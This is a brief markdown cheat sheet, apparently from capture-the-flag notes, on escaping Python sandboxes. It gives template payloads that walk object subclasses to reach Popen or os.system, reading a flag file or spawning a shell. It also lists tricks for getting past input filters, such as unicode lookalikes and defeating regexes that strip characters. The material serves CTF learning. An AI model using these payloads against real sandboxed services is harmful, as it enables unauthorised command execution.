[BACK](../README.md)

# Jail Escape

## Python

- Quick templates:
  - ().__class__.__bases__[0].__subclasses__()[INDEX_OF_POPEN](["/bin/cat","flag"], stdout=-1).communicate()
  - ().__class__.__bases__[0].__subclasses__()[INDEX_OF_os._wrap_close].__init__.__globals__['sys'].modules['os'].system('sh')
### Filters bypass

- Try using unicode chars instead of the ascii ones. 
- Can also try a "blind" exec with error messages giving us info 
- if there is a regex to filter that replaces invalid chars with nothing:
  - ex: regex blocks __ and {{
  - if we want to write {{, we can write {__{
    - regex replaces __ with nothing and return {{ 